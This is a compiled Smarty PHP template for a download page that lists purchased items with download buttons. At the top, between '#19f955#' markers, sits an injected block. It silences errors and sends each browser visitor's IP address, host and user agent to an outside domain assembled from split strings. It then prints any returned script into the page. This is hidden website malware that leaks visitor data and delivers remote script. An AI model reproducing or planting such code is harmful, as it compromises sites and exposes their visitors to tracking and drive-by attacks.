<?php /* Smarty version 2.6.22, created on 2009-03-20 16:26:57
         compiled from C:/Program+Files/Apache+Software+Foundation/Apache2.2/htdocs//templates/purchased_items.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<p>If you encounter a problem while downloading an item, you may contact me at <a href="mailto:<?php echo $this->_tpl_vars['admin_email']; ?>
"><?php echo $this->_tpl_vars['admin_email']; ?>
</a>.</p>

<?php $_from = $this->_tpl_vars['purchased_items']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>
	<p>
		<form action="<?php echo $this->_tpl_vars['item']['full_item_url']; ?>
" method="GET">
			<input type="submit" value="Download <?php echo $this->_tpl_vars['item']['name']; ?>
" class="buttonSubmit" />
		</form>
	</p>
<?php endforeach; endif; unset($_from); ?>